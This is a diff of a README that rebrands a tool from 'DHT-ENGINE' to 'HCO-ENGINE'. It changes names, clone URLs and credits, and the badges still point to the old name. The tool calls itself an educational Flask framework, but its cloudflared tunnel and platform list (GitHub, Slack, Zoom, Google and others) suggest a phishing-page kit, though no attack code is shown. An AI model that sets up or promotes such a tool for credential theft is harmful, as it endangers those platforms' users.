@@ -1,8 +1,8 @@
-# DHT-ENGINE 🛠️
+# HCO-ENGINE 🛠️
 
-![DHT-HACKERS](https://img.shields.io/badge/DHT-HACKERS-magenta?style=for-the-badge) 
+![HCO-HACKERS](https://img.shields.io/badge/DHT-HACKERS-magenta?style=for-the-badge) 
 
-![DHT-GHOST](https://img.shields.io/badge/DHT-GHOST-magenta?style=for-the-badge)
+![HCO-GHOST](https://img.shields.io/badge/DHT-GHOST-magenta?style=for-the-badge)
 
 Welcome to **DHT-ENGINE**, an educational Python-based web framework designed for learning Flask, threading, and real-time web interaction. This project demonstrates dynamic web forms, multi-step input handling, and terminal output with **Rich** tables and panels.
 
@@ -47,16 +47,16 @@ Welcome to **DHT-ENGINE**, an educational Python-based web framework designed fo
 ```bash
 pkg update && pkg upgrade -y  
 pkg install python git cloudflared -y  
-git clone https://github.com/DHThackers-10/DHT-ENGINE  
-cd DHT-ENGINE  
+git clone https://github.com/anonymous404-hash/HCO-ENGINE  
+cd HCO-ENGINE  
 pip install Flask colorama rich pyfiglet  
 ```
 ## Linux (Ubuntu/Debian)
 ```bash
 sudo apt update && sudo apt upgrade -y  
 sudo apt install -y python3 python3-pip git cloudflared  
-git clone https://github.com/DHThackers-10/DHT-ENGINE  
-cd DHT-ENGINE  
+git clone https://github.com/anonymous404-hash/HCO-ENGINE  
+cd HCO-ENGINE  
 python3 -m venv venv  
 source venv/bin/activate   
 pip install Flask colorama rich pyfiglet  
@@ -65,8 +65,8 @@ pip install Flask colorama rich pyfiglet
 ```bash
 sudo apt update && sudo apt upgrade -y  
 sudo apt install -y python3 python3-pip git cloudflared  
-git clone https://github.com/DHThackers-10/DHT-ENGINE  
-cd DHT-ENGINE  
+git clone https://github.com/anonymous404-hash/HCO-ENGINE  
+cd HCO-ENGINE  
 python3 -m venv venv  
 source venv/bin/activate  
 pip install Flask colorama rich pyfiglet  
@@ -77,9 +77,9 @@ pip install Flask colorama rich pyfiglet
 
 1. Run the engine:
 ```bash
-python DHT-ENGINE.py
+python HCO-ENGINE.py
 ```
-2. Terminal Banner: Shows a styled DHT banner.
+2. Terminal Banner: Shows a styled HCO banner.
 
 3. Select Platform: Pick a platform from the terminal list.
 
@@ -123,13 +123,13 @@ Others: GitHub, GitLab, Stack Overflow, Notion, Wordpress, Slack, Zoom, Google D
 
 # Credits 💳
 
-**DHT-GHOST:** THE KING OF DIGITAL WORLD
+**HCO-GHOST:** THE KING OF DIGITAL WORLD
 
-**DHT-HACKERS Team:** Core development and maintenance 
+**HCO-HACKERS Team:** Core development and maintenance 
 
-**YouTube Channel:** Tutorials & guides — [DHT-HACKERS](https://www.youtube.com/@DHT-HACKERS_10)
+**YouTube Channel:** Tutorials & guides — [HCO-HACKERS](https://www.youtube.com/@DHT-HACKERS_10)
 
-**Community:** DHT-HACKERS discussion & learning — [WhatsApp Group](https://chat.whatsapp.com/G2hCkCzylra2OENEfhH8Os)
+**Community:** HCO-HACKERS discussion & learning — [WhatsApp Group](https://chat.whatsapp.com/G2hCkCzylra2OENEfhH8Os)
 
 ---
 
